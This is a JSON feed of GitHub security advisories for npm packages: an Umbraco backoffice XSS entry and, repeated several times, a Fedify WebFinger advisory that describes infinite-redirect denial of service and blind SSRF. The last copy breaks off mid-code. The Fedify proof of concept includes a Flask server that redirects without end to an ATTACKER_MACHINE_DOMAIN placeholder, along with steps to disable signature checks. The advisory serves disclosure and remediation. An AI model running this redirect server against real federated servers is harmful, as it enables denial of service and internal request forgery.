{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for JavaScript packages hosted at npmjs.com",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/npm.json",
    "description": "Security Advisory for JavaScript packages hosted at npmjs.com on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Authenticated users are able to exploit an XSS vulnerability when viewing certain localized backoffice components.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Will be patched in 14.3.2 and 15.1.2.</p>\n<p>Note:\nThis issue was reported by Pratik Patil from NetSPI @Nexusss-ppatil</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/umbraco/Umbraco-CMS/security/advisories/GHSA-wv8v-rmw2-25wc\">https://github.com/umbraco/Umbraco-CMS/security/advisories/GHSA-wv8v-rmw2-25wc</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-24012\">https://nvd.nist.gov/vuln/detail/CVE-2025-24012</a></li>\n<li><a href=\"https://github.com/umbraco/Umbraco-CMS/commit/d4f8754f933895b3a329296e25ddea6f84a0aea2\">https://github.com/umbraco/Umbraco-CMS/commit/d4f8754f933895b3a329296e25ddea6f84a0aea2</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wv8v-rmw2-25wc\">https://github.com/advisories/GHSA-wv8v-rmw2-25wc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wv8v-rmw2-25wc",
            "title": "[@umbraco-cms/backoffice] XSS/HTML Injection Vulnerability in Umbraco Backoffice Components",
            "date_modified": "2025-01-21T19:59:13.000Z",
            "date_published": "2025-01-21T19:59:13.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wv8v-rmw2-25wc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Authenticated users are able to exploit an XSS vulnerability when viewing certain localized backoffice components.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Will be patched in 14.3.2 and 15.1.2.</p>\n<p>Note:\nThis issue was reported by Pratik Patil from NetSPI @Nexusss-ppatil</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/umbraco/Umbraco-CMS/security/advisories/GHSA-wv8v-rmw2-25wc\">https://github.com/umbraco/Umbraco-CMS/security/advisories/GHSA-wv8v-rmw2-25wc</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-24012\">https://nvd.nist.gov/vuln/detail/CVE-2025-24012</a></li>\n<li><a href=\"https://github.com/umbraco/Umbraco-CMS/commit/d4f8754f933895b3a329296e25ddea6f84a0aea2\">https://github.com/umbraco/Umbraco-CMS/commit/d4f8754f933895b3a329296e25ddea6f84a0aea2</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wv8v-rmw2-25wc\">https://github.com/advisories/GHSA-wv8v-rmw2-25wc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wv8v-rmw2-25wc",
            "title": "[@umbraco-cms/backoffice] XSS/HTML Injection Vulnerability in Umbraco Backoffice Components",
            "date_modified": "2025-01-21T19:59:13.000Z",
            "date_published": "2025-01-21T19:59:13.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wv8v-rmw2-25wc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>This vulnerability allows a user to maneuver the Webfinger mechanism to perform a GET request to any internal resource on any Host, Port, URL combination regardless of present security mechanisms, and forcing the victim’s server into an infinite loop causing Denial of Service.\nMoreover, this issue can also be maneuvered into performing a Blind SSRF attack.</p>\n<h3 id=\"details\">Details</h3>\n<p>The Webfinger endpoint takes a remote domain for checking accounts as a feature, however, as per the ActivityPub spec (<a href=\"https://www.w3.org/TR/activitypub/#security-considerations\">https://www.w3.org/TR/activitypub/#security-considerations</a>), on the security considerations section at B.3, access to Localhost services should be prevented while running in production.</p>\n<p>The <strong>lookupWebFinger</strong> function, responsible for returning an actor handler for received actor objects from a remote server, can be abused to perform a Denial of Service (DoS) and Blind SSRF attacks while attempting to resolve a malicious actor’s object.\nOn Fedify, two client-facing functions implement the <strong>lookupWebFinger</strong> function- <strong>getActorHandle</strong>, and <strong>lookupObject</strong>, which are both used as a wrapper for the vulnerable lookup function.\nAs the <strong>lookupObject</strong> function is implemented only for CLI usage, we won’t focus our PoC and explanation on it, but it is still vulnerable in the same way <strong>getActorHandle</strong> is.</p>\n<p>The <strong>getActorHandle</strong> function is a wrapper function for the <strong>getActorHandleInternal</strong> function (both present at <em>/src/vocab/actor.ts</em>):</p>\n<pre><code class=\"language-javascript\">async function getActorHandleInternal(\n  actor: Actor | URL,\n  options: GetActorHandleOptions = {},\n): Promise&lt;`@${string}@${string}` | `${string}@${string}`&gt; {\n  const actorId = actor instanceof URL ? actor : actor.id;\n  if (actorId != null) {\n    const result = await lookupWebFinger(actorId, {\n      userAgent: options.userAgent,\n      tracerProvider: options.tracerProvider,\n    });\n    if (result != null) {\n      const aliases = [...(result.aliases ?? [])];\n      if (result.subject != null) aliases.unshift(result.subject);\n      for (const alias of aliases) {\n        const match = alias.match(/^acct:([^@]+)@([^@]+)$/);\n        if (match != null) {\n          const hostname = new URL(`https://${match[2]}/`).hostname;\n          if (\n            hostname !== actorId.hostname &amp;&amp;\n            !await verifyCrossOriginActorHandle(\n              actorId.href,\n              alias,\n              options.userAgent,\n              options.tracerProvider,\n            )\n          ) {\n            continue;\n          }\n          return normalizeActorHandle(`@${match[1]}@${match[2]}`, options);\n        }\n      }\n    }\n  }\n  if (\n    !(actor instanceof URL) &amp;&amp; actor.preferredUsername != null &amp;&amp;\n    actor.id != null\n  ) {\n    return normalizeActorHandle(\n      `@${actor.preferredUsername}@${actor.id.host}`,\n      options,\n    );\n  }\n  throw new TypeError(\n    \"Actor does not have enough information to get the handle.\",\n  );\n}\n</code></pre>\n<p>The <strong>actorId</strong> parameter containing a URL of the actor ID sinks into the <strong>lookupWebFinger</strong> function which is a wrapper for the <strong>lookupWebFingerInternal</strong>:</p>\n<pre><code class=\"language-javascript\">async function lookupWebFingerInternal(\n  resource: URL | string,\n  options: LookupWebFingerOptions = {},\n): Promise&lt;ResourceDescriptor | null&gt; {\n  if (typeof resource === \"string\") resource = new URL(resource);\n  let protocol = \"https:\";\n  let server: string;\n  if (resource.protocol === \"acct:\") {\n    const atPos = resource.pathname.lastIndexOf(\"@\");\n    if (atPos &lt; 0) return null;\n    server = resource.pathname.substring(atPos + 1);\n    if (server === \"\") return null;\n  } else {\n    protocol = resource.protocol;\n    server = resource.host;\n  }\n  let url = new URL(`${protocol}//${server}/.well-known/webfinger`);\n  url.searchParams.set(\"resource\", resource.href);\n  while (true) {\n    logger.debug(\n      \"Fetching WebFinger resource descriptor from {url}...\",\n      { url: url.href },\n    );\n    let response: Response;\n    try {\n      response = await fetch(url, {\n        headers: {\n          Accept: \"application/jrd+json\",\n          \"User-Agent\": typeof options.userAgent === \"string\"\n            ? options.userAgent\n            : getUserAgent(options.userAgent),\n        },\n        redirect: \"manual\",\n      });\n    } catch (error) {\n      logger.debug(\n        \"Failed to fetch WebFinger resource descriptor: {error}\",\n        { url: url.href, error },\n      );\n      return null;\n    }\n    if (\n      response.status &gt;= 300 &amp;&amp; response.status &lt; 400 &amp;&amp;\n      response.headers.has(\"Location\")\n    ) {\n      url = new URL(\n        response.headers.get(\"Location\")!,\n        response.url == null || response.url === \"\" ? url : response.url,\n      );\n      continue;\n    }\n    if (!response.ok) {\n      logger.debug(\n        \"Failed to fetch WebFinger resource descriptor: {status} {statusText}.\",\n        {\n          url: url.href,\n          status: response.status,\n          statusText: response.statusText,\n        },\n      );\n      return null;\n    }\n    try {\n      return await response.json() as ResourceDescriptor;\n    } catch (e) {\n      if (e instanceof SyntaxError) {\n        logger.debug(\n          \"Failed to parse WebFinger resource descriptor as JSON: {error}\",\n          { error: e },\n        );\n        return null;\n      }\n      throw e;\n    }\n  }\n}\n</code></pre>\n<p>The function takes the <strong>actorId</strong> parameter containing the actor ID URL, extracts the scheme and uses the rest of the URL (host+port+path) directly inside a hard-coded Webfinger URL address which in turn sinks into a fetch request.</p>\n<p>On the fetch request, the <strong>redirect</strong> attribute is set to “<strong>manual</strong>” preventing automated redirects. However, redirects are still handled using custom code that loops over responses and re-fetching the URL found inside the “Location” header until receiving a valid response or an error occurs (loop keeps until 300&gt;status code&gt;400).</p>\n<p>This custom redirect implementation contains multiple issues:\n1.The redirect loop is endless ( while(true) loop ) without any iteration limiting, allowing attackers to perform DoS via endless redirecting.\n2. A Blind SSRF attack to any URL, with arbitrary Host, Port and Path is possible via the current custom redirect implementation.\n3. As the redirect handler is a custom one, it breaches the security mechanisms presented by the native redirect handler of fetch - allowing the attacker to redirect to different schemes such as data or file schemes.</p>\n<p>In order to successfully perform any of the attacks described above, an attacker needs to create a federated app which presents a malicious actor object, containing an actor ID URL of a second server which performs a recursive redirect to itself, or a URL containing an internal resource.</p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>In order to show a use case of the vulnerability, we can use the demo app presented at this URL: <a href=\"https://github.com/dahlia/microblog\">https://github.com/dahlia/microblog</a>.</li>\n<li>We will create two machines, victim and attacker, each one on a different server with different domains.</li>\n</ol>\n<p><strong><em>Victim Machine</em></strong></p>\n<ol>\n<li>Create a new instance (we tested on ubuntu’s latest version), and update the package manager.</li>\n<li>Install a Deno server:\n<code>curl -fsSL https://deno.land/install.sh | sh</code>\n<code>source ~/.bashrc</code>\n<code>deno --version #check deno is working</code></li>\n<li>Pull the git repository of the victim blog app:\n<code>git clone https://github.com/dahlia/fedify.git</code></li>\n<li>Modify the federation object to remove signature checks for the sake of easy testing:\nOn file <strong><em>/examples/blog/federation/mod.ts</em></strong> edit the <strong><em>createFederation</em></strong> object the following attribute: <strong><em>skipSignatureVerification: true</em></strong>.</li>\n<li>Change into the blog app directory ( /examples/blog ) and run the app:\n<code>deno task preview</code></li>\n<li>Surf to the application on the browser, and register a user on the app.</li>\n</ol>\n<p><strong><em>Attacker Machine</em></strong></p>\n<ol>\n<li>Create a new instance (we tested on ubuntu’s latest version), and update the package manager.</li>\n<li>Install NVM in order to install the latest version of NPM and NODEJS (and source current shell to check it worked):\n<code>curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash</code>\n<code>source ~/.bashrc</code>\n<code>nvm list-remote</code></li>\n<li>Install the latest stable version:\n<code>nvm install {latest_ver} #for example: v20.10.0</code>\n<code>source ~/.bashrc</code>\n<code>npm -v #check it works</code>\n<code>node -v #check it works</code></li>\n<li>Download the attacker app repository:\n<code>git clone https://github.com/dahlia/microblog.git</code></li>\n<li>Disable request signature validations:\nEdit the <strong><em>/src/federation.ts</em></strong> file and add a <strong><em>skipSignatureVerification: true</em></strong> attribute to the <strong><em>createFederation</em></strong> object.</li>\n<li>Modify the <strong><em>/src/federation.ts</em></strong> file and tamper with the Person object on the actor dispatcher ( <strong><em>setActorDispatcher(\"/users/{identifier}\"</em></strong> ) - change the actor ID attribute **<em>“id: ctx.getActorUri(identifier)</em><strong>” into “</strong><em>id: new URL(‘http://:1337/users/enterloop’)</em>**”.</li>\n<li>Install python flask and create the Python Flask redirect server:\n<code>apt update</code>\n<code>apt install python3-flask</code></li>\n</ol>\n<pre><code class=\"language-python\">from flask import Flask, redirect\n\napp = Flask(__name__)\n\n@app.route('/health')\ndef health():\n    return \"hello\", 200\n\n@app.route('/.well-known/webfinger')\ndef ssrfinger():\n    return redirect(\"http://&lt;ATTACKER_MACHINE_DOMAIN&gt;:1337/endlessloop\")\n\n@app.route('/endlessloop')\ndef endlessloop():\n    return redirect(\"http://&lt;ATTACKER_MACHINE_DOMAIN&gt;:1337/endlessloop\")\n\nif __name__ == '__main__':\n    app.run(debug=True,host='0.0.0.0' ,port=1337)\n</code></pre>\n<ol start=\"8\">\n<li>Run the python server and attempt to reach the “**_/health_**” path to see the server functions as expected.</li>\n<li>Read the <strong><em>README.txt</em></strong> file on the attacker app and follow the instructions on how to execute the app.</li>\n<li>Surf the app on the browser and attempt to follow the federated user on the victim’s machine.</li>\n<li>Send the “follow” request and watch the victim app continue to query the redirect server infinitely (It is possible to repeat this step multiple times causing multiple loops).</li>\n</ol>\n<h3 id=\"impact\">Impact</h3>\n<ol>\n<li>Implement a limiting stop condition for the endless loop to prevent infinite loops.</li>\n<li>Validate the scheme while performing a manual redirection handler.</li>\n<li>For each web resource (for the <strong><em>lookupWebFinger</em></strong> function and also URLs found on the “**<em>Location</em><strong>” header inside the loop) use the “</strong><em>validatePublicUrl</em>**” function to verify that it is not targeting a local resource.</li>\n</ol>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/dahlia/fedify/security/advisories/GHSA-c59p-wq67-24wx\">https://github.com/dahlia/fedify/security/advisories/GHSA-c59p-wq67-24wx</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-23221\">https://nvd.nist.gov/vuln/detail/CVE-2025-23221</a></li>\n<li><a href=\"https://github.com/dahlia/fedify/commit/8be3c2038eebf4ae12481683a1e809b314be3151\">https://github.com/dahlia/fedify/commit/8be3c2038eebf4ae12481683a1e809b314be3151</a></li>\n<li><a href=\"https://github.com/dahlia/fedify/commit/c505eb82fcd6b5b17174c6659c29721bc801ab9a\">https://github.com/dahlia/fedify/commit/c505eb82fcd6b5b17174c6659c29721bc801ab9a</a></li>\n<li><a href=\"https://github.com/dahlia/fedify/commit/e921134dd5097586e4563ea80b9e8d1b5460a645\">https://github.com/dahlia/fedify/commit/e921134dd5097586e4563ea80b9e8d1b5460a645</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c59p-wq67-24wx\">https://github.com/advisories/GHSA-c59p-wq67-24wx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c59p-wq67-24wx",
            "title": "[@fedify/fedify] Infinite loop and Blind SSRF found inside the Webfinger mechanism in @fedify/fedify",
            "date_modified": "2025-01-21T19:58:30.000Z",
            "date_published": "2025-01-21T19:58:29.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c59p-wq67-24wx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>This vulnerability allows a user to maneuver the Webfinger mechanism to perform a GET request to any internal resource on any Host, Port, URL combination regardless of present security mechanisms, and forcing the victim’s server into an infinite loop causing Denial of Service.\nMoreover, this issue can also be maneuvered into performing a Blind SSRF attack.</p>\n<h3 id=\"details\">Details</h3>\n<p>The Webfinger endpoint takes a remote domain for checking accounts as a feature, however, as per the ActivityPub spec (<a href=\"https://www.w3.org/TR/activitypub/#security-considerations\">https://www.w3.org/TR/activitypub/#security-considerations</a>), on the security considerations section at B.3, access to Localhost services should be prevented while running in production.</p>\n<p>The <strong>lookupWebFinger</strong> function, responsible for returning an actor handler for received actor objects from a remote server, can be abused to perform a Denial of Service (DoS) and Blind SSRF attacks while attempting to resolve a malicious actor’s object.\nOn Fedify, two client-facing functions implement the <strong>lookupWebFinger</strong> function- <strong>getActorHandle</strong>, and <strong>lookupObject</strong>, which are both used as a wrapper for the vulnerable lookup function.\nAs the <strong>lookupObject</strong> function is implemented only for CLI usage, we won’t focus our PoC and explanation on it, but it is still vulnerable in the same way <strong>getActorHandle</strong> is.</p>\n<p>The <strong>getActorHandle</strong> function is a wrapper function for the <strong>getActorHandleInternal</strong> function (both present at <em>/src/vocab/actor.ts</em>):</p>\n<pre><code class=\"language-javascript\">async function getActorHandleInternal(\n  actor: Actor | URL,\n  options: GetActorHandleOptions = {},\n): Promise&lt;`@${string}@${string}` | `${string}@${string}`&gt; {\n  const actorId = actor instanceof URL ? actor : actor.id;\n  if (actorId != null) {\n    const result = await lookupWebFinger(actorId, {\n      userAgent: options.userAgent,\n      tracerProvider: options.tracerProvider,\n    });\n    if (result != null) {\n      const aliases = [...(result.aliases ?? [])];\n      if (result.subject != null) aliases.unshift(result.subject);\n      for (const alias of aliases) {\n        const match = alias.match(/^acct:([^@]+)@([^@]+)$/);\n        if (match != null) {\n          const hostname = new URL(`https://${match[2]}/`).hostname;\n          if (\n            hostname !== actorId.hostname &amp;&amp;\n            !await verifyCrossOriginActorHandle(\n              actorId.href,\n              alias,\n              options.userAgent,\n              options.tracerProvider,\n            )\n          ) {\n            continue;\n          }\n          return normalizeActorHandle(`@${match[1]}@${match[2]}`, options);\n        }\n      }\n    }\n  }\n  if (\n    !(actor instanceof URL) &amp;&amp; actor.preferredUsername != null &amp;&amp;\n    actor.id != null\n  ) {\n    return normalizeActorHandle(\n      `@${actor.preferredUsername}@${actor.id.host}`,\n      options,\n    );\n  }\n  throw new TypeError(\n    \"Actor does not have enough information to get the handle.\",\n  );\n}\n</code></pre>\n<p>The <strong>actorId</strong> parameter containing a URL of the actor ID sinks into the <strong>lookupWebFinger</strong> function which is a wrapper for the <strong>lookupWebFingerInternal</strong>:</p>\n<pre><code class=\"language-javascript\">async function lookupWebFingerInternal(\n  resource: URL | string,\n  options: LookupWebFingerOptions = {},\n): Promise&lt;ResourceDescriptor | null&gt; {\n  if (typeof resource === \"string\") resource = new URL(resource);\n  let protocol = \"https:\";\n  let server: string;\n  if (resource.protocol === \"acct:\") {\n    const atPos = resource.pathname.lastIndexOf(\"@\");\n    if (atPos &lt; 0) return null;\n    server = resource.pathname.substring(atPos + 1);\n    if (server === \"\") return null;\n  } else {\n    protocol = resource.protocol;\n    server = resource.host;\n  }\n  let url = new URL(`${protocol}//${server}/.well-known/webfinger`);\n  url.searchParams.set(\"resource\", resource.href);\n  while (true) {\n    logger.debug(\n      \"Fetching WebFinger resource descriptor from {url}...\",\n      { url: url.href },\n    );\n    let response: Response;\n    try {\n      response = await fetch(url, {\n        headers: {\n          Accept: \"application/jrd+json\",\n          \"User-Agent\": typeof options.userAgent === \"string\"\n            ? options.userAgent\n            : getUserAgent(options.userAgent),\n        },\n        redirect: \"manual\",\n      });\n    } catch (error) {\n      logger.debug(\n        \"Failed to fetch WebFinger resource descriptor: {error}\",\n        { url: url.href, error },\n      );\n      return null;\n    }\n    if (\n      response.status &gt;= 300 &amp;&amp; response.status &lt; 400 &amp;&amp;\n      response.headers.has(\"Location\")\n    ) {\n      url = new URL(\n        response.headers.get(\"Location\")!,\n        response.url == null || response.url === \"\" ? url : response.url,\n      );\n      continue;\n    }\n    if (!response.ok) {\n      logger.debug(\n        \"Failed to fetch WebFinger resource descriptor: {status} {statusText}.\",\n        {\n          url: url.href,\n          status: response.status,\n          statusText: response.statusText,\n        },\n      );\n      return null;\n    }\n    try {\n      return await response.json() as ResourceDescriptor;\n    } catch (e) {\n      if (e instanceof SyntaxError) {\n        logger.debug(\n          \"Failed to parse WebFinger resource descriptor as JSON: {error}\",\n          { error: e },\n        );\n        return null;\n      }\n      throw e;\n    }\n  }\n}\n</code></pre>\n<p>The function takes the <strong>actorId</strong> parameter containing the actor ID URL, extracts the scheme and uses the rest of the URL (host+port+path) directly inside a hard-coded Webfinger URL address which in turn sinks into a fetch request.</p>\n<p>On the fetch request, the <strong>redirect</strong> attribute is set to “<strong>manual</strong>” preventing automated redirects. However, redirects are still handled using custom code that loops over responses and re-fetching the URL found inside the “Location” header until receiving a valid response or an error occurs (loop keeps until 300&gt;status code&gt;400).</p>\n<p>This custom redirect implementation contains multiple issues:\n1.The redirect loop is endless ( while(true) loop ) without any iteration limiting, allowing attackers to perform DoS via endless redirecting.\n2. A Blind SSRF attack to any URL, with arbitrary Host, Port and Path is possible via the current custom redirect implementation.\n3. As the redirect handler is a custom one, it breaches the security mechanisms presented by the native redirect handler of fetch - allowing the attacker to redirect to different schemes such as data or file schemes.</p>\n<p>In order to successfully perform any of the attacks described above, an attacker needs to create a federated app which presents a malicious actor object, containing an actor ID URL of a second server which performs a recursive redirect to itself, or a URL containing an internal resource.</p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>In order to show a use case of the vulnerability, we can use the demo app presented at this URL: <a href=\"https://github.com/dahlia/microblog\">https://github.com/dahlia/microblog</a>.</li>\n<li>We will create two machines, victim and attacker, each one on a different server with different domains.</li>\n</ol>\n<p><strong><em>Victim Machine</em></strong></p>\n<ol>\n<li>Create a new instance (we tested on ubuntu’s latest version), and update the package manager.</li>\n<li>Install a Deno server:\n<code>curl -fsSL https://deno.land/install.sh | sh</code>\n<code>source ~/.bashrc</code>\n<code>deno --version #check deno is working</code></li>\n<li>Pull the git repository of the victim blog app:\n<code>git clone https://github.com/dahlia/fedify.git</code></li>\n<li>Modify the federation object to remove signature checks for the sake of easy testing:\nOn file <strong><em>/examples/blog/federation/mod.ts</em></strong> edit the <strong><em>createFederation</em></strong> object the following attribute: <strong><em>skipSignatureVerification: true</em></strong>.</li>\n<li>Change into the blog app directory ( /examples/blog ) and run the app:\n<code>deno task preview</code></li>\n<li>Surf to the application on the browser, and register a user on the app.</li>\n</ol>\n<p><strong><em>Attacker Machine</em></strong></p>\n<ol>\n<li>Create a new instance (we tested on ubuntu’s latest version), and update the package manager.</li>\n<li>Install NVM in order to install the latest version of NPM and NODEJS (and source current shell to check it worked):\n<code>curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash</code>\n<code>source ~/.bashrc</code>\n<code>nvm list-remote</code></li>\n<li>Install the latest stable version:\n<code>nvm install {latest_ver} #for example: v20.10.0</code>\n<code>source ~/.bashrc</code>\n<code>npm -v #check it works</code>\n<code>node -v #check it works</code></li>\n<li>Download the attacker app repository:\n<code>git clone https://github.com/dahlia/microblog.git</code></li>\n<li>Disable request signature validations:\nEdit the <strong><em>/src/federation.ts</em></strong> file and add a <strong><em>skipSignatureVerification: true</em></strong> attribute to the <strong><em>createFederation</em></strong> object.</li>\n<li>Modify the <strong><em>/src/federation.ts</em></strong> file and tamper with the Person object on the actor dispatcher ( <strong><em>setActorDispatcher(\"/users/{identifier}\"</em></strong> ) - change the actor ID attribute **<em>“id: ctx.getActorUri(identifier)</em><strong>” into “</strong><em>id: new URL(‘http://:1337/users/enterloop’)</em>**”.</li>\n<li>Install python flask and create the Python Flask redirect server:\n<code>apt update</code>\n<code>apt install python3-flask</code></li>\n</ol>\n<pre><code class=\"language-python\">from flask import Flask, redirect\n\napp = Flask(__name__)\n\n@app.route('/health')\ndef health():\n    return \"hello\", 200\n\n@app.route('/.well-known/webfinger')\ndef ssrfinger():\n    return redirect(\"http://&lt;ATTACKER_MACHINE_DOMAIN&gt;:1337/endlessloop\")\n\n@app.route('/endlessloop')\ndef endlessloop():\n    return redirect(\"http://&lt;ATTACKER_MACHINE_DOMAIN&gt;:1337/endlessloop\")\n\nif __name__ == '__main__':\n    app.run(debug=True,host='0.0.0.0' ,port=1337)\n</code></pre>\n<ol start=\"8\">\n<li>Run the python server and attempt to reach the “**_/health_**” path to see the server functions as expected.</li>\n<li>Read the <strong><em>README.txt</em></strong> file on the attacker app and follow the instructions on how to execute the app.</li>\n<li>Surf the app on the browser and attempt to follow the federated user on the victim’s machine.</li>\n<li>Send the “follow” request and watch the victim app continue to query the redirect server infinitely (It is possible to repeat this step multiple times causing multiple loops).</li>\n</ol>\n<h3 id=\"impact\">Impact</h3>\n<ol>\n<li>Implement a limiting stop condition for the endless loop to prevent infinite loops.</li>\n<li>Validate the scheme while performing a manual redirection handler.</li>\n<li>For each web resource (for the <strong><em>lookupWebFinger</em></strong> function and also URLs found on the “**<em>Location</em><strong>” header inside the loop) use the “</strong><em>validatePublicUrl</em>**” function to verify that it is not targeting a local resource.</li>\n</ol>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/dahlia/fedify/security/advisories/GHSA-c59p-wq67-24wx\">https://github.com/dahlia/fedify/security/advisories/GHSA-c59p-wq67-24wx</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-23221\">https://nvd.nist.gov/vuln/detail/CVE-2025-23221</a></li>\n<li><a href=\"https://github.com/dahlia/fedify/commit/8be3c2038eebf4ae12481683a1e809b314be3151\">https://github.com/dahlia/fedify/commit/8be3c2038eebf4ae12481683a1e809b314be3151</a></li>\n<li><a href=\"https://github.com/dahlia/fedify/commit/c505eb82fcd6b5b17174c6659c29721bc801ab9a\">https://github.com/dahlia/fedify/commit/c505eb82fcd6b5b17174c6659c29721bc801ab9a</a></li>\n<li><a href=\"https://github.com/dahlia/fedify/commit/e921134dd5097586e4563ea80b9e8d1b5460a645\">https://github.com/dahlia/fedify/commit/e921134dd5097586e4563ea80b9e8d1b5460a645</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c59p-wq67-24wx\">https://github.com/advisories/GHSA-c59p-wq67-24wx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c59p-wq67-24wx",
            "title": "[@fedify/fedify] Infinite loop and Blind SSRF found inside the Webfinger mechanism in @fedify/fedify",
            "date_modified": "2025-01-21T19:58:30.000Z",
            "date_published": "2025-01-21T19:58:29.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c59p-wq67-24wx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>This vulnerability allows a user to maneuver the Webfinger mechanism to perform a GET request to any internal resource on any Host, Port, URL combination regardless of present security mechanisms, and forcing the victim’s server into an infinite loop causing Denial of Service.\nMoreover, this issue can also be maneuvered into performing a Blind SSRF attack.</p>\n<h3 id=\"details\">Details</h3>\n<p>The Webfinger endpoint takes a remote domain for checking accounts as a feature, however, as per the ActivityPub spec (<a href=\"https://www.w3.org/TR/activitypub/#security-considerations\">https://www.w3.org/TR/activitypub/#security-considerations</a>), on the security considerations section at B.3, access to Localhost services should be prevented while running in production.</p>\n<p>The <strong>lookupWebFinger</strong> function, responsible for returning an actor handler for received actor objects from a remote server, can be abused to perform a Denial of Service (DoS) and Blind SSRF attacks while attempting to resolve a malicious actor’s object.\nOn Fedify, two client-facing functions implement the <strong>lookupWebFinger</strong> function- <strong>getActorHandle</strong>, and <strong>lookupObject</strong>, which are both used as a wrapper for the vulnerable lookup function.\nAs the <strong>lookupObject</strong> function is implemented only for CLI usage, we won’t focus our PoC and explanation on it, but it is still vulnerable in the same way <strong>getActorHandle</strong> is.</p>\n<p>The <strong>getActorHandle</strong> function is a wrapper function for the <strong>getActorHandleInternal</strong> function (both present at <em>/src/vocab/actor.ts</em>):</p>\n<pre><code class=\"language-javascript\">async function getActorHandleInternal(\n  actor: Actor | URL,\n  options: GetActorHandleOptions = {},\n): Promise&lt;`@${string}@${string}` | `${string}@${string}`&gt; {\n  const actorId = actor instanceof URL ? actor : actor.id;\n  if (actorId != null) {\n    const result = await lookupWebFinger(actorId, {\n      userAgent: options.userAgent,\n      tracerProvider: options.tracerProvider,\n    });\n    if (result != null) {\n      const aliases = [...(result.aliases ?? [])];\n      if (result.subject != null) aliases.unshift(result.subject);\n      for (const alias of aliases) {\n        const match = alias.match(/^acct:([^@]+)@([^@]+)$/);\n        if (match != null) {\n          const hostname = new URL(`https://${match[2]}/`).hostname;\n          if (\n            hostname !== actorId.hostname &amp;&amp;\n            !await verifyCrossOriginActorHandle(\n              actorId.href,\n              alias,\n              options.userAgent,\n              options.tracerProvider,\n            )\n          ) {\n            continue;\n          }\n          return normalizeActorHandle(`@${match[1]}@${match[2]}`, options);\n        }\n      }\n    }\n  }\n  if (\n    !(actor instanceof URL) &amp;&amp; actor.preferredUsername != null &amp;&amp;\n    actor.id != null\n  ) {\n    return normalizeActorHandle(\n      `@${actor.preferredUsername}@${actor.id.host}`,\n      options,\n    );\n  }\n  throw new TypeError(\n    \"Actor does not have enough information to get the handle.\",\n  );\n}\n</code></pre>\n<p>The <strong>actorId</strong> parameter containing a URL of the actor ID sinks into the <strong>lookupWebFinger</strong> function which is a wrapper for the <strong>lookupWebFingerInternal</strong>:</p>\n<pre><code class=\"language-javascript\">async function lookupWebFingerInternal(\n  resource: URL | string,\n  options: LookupWebFingerOptions = {},\n): Promise&lt;ResourceDescriptor | null&gt; {\n  if (typeof resource === \"string\") resource = new URL(resource);\n  let protocol = \"https:\";\n  let server: string;\n  if (resource.protocol === \"acct:\") {\n    const atPos = resource.pathname.lastIndexOf(\"@\");\n    if (atPos &lt; 0) return null;\n    server = resource.pathname.substring(atPos + 1);\n    if (server === \"\") return null;\n  } else {\n    protocol = resource.protocol;\n    server = resource.host;\n  }\n  let url = new URL(`${protocol}//${server}/.well-known/webfinger`);\n  url.searchParams.set(\"resource\", resource.href);\n  while (true) {\n    logger.debug(\n      \"Fetching WebFinger resource descriptor from {url}...\",\n      { url: url.href },\n    );\n    let response: Response;\n    try {\n      response = await fetch(url, {\n        headers: {\n          Accept: \"application/jrd+json\",\n          \"User-Agent\": typeof options.userAgent === \"string\"\n            ? options.userAgent\n            : getUserAgent(options.userAgent),\n        },\n        redirect: \"manual\",\n      });\n    } catch (error) {\n      logger.debug(\n        \"Failed to fetch WebFinger resource descriptor: {error}\",\n        { url: url.href, error },\n      );\n      return null;\n    }\n    if (\n      response.status &gt;= 300 &amp;&amp; response.status &lt; 400 &amp;&amp;\n      response.headers.has(\"Location\")\n    ) {\n      url = new URL(\n        response.headers.get(\"Location\")!,\n        response.url == null || response.url === \"\" ? url : response.url,\n      );\n      continue;\n    }\n    if (!response.ok) {\n      logger.debug(\n        \"Failed to fetch WebFinger resource descriptor: {status} {statusText}.\",\n        {\n          url: url.href,\n          status: response.status,\n          statusText: response.statusText,\n        },\n      );\n      return null;\n    }\n    try {\n      return await response.json() as ResourceDescriptor;\n    } catch (e) {\n      if (e 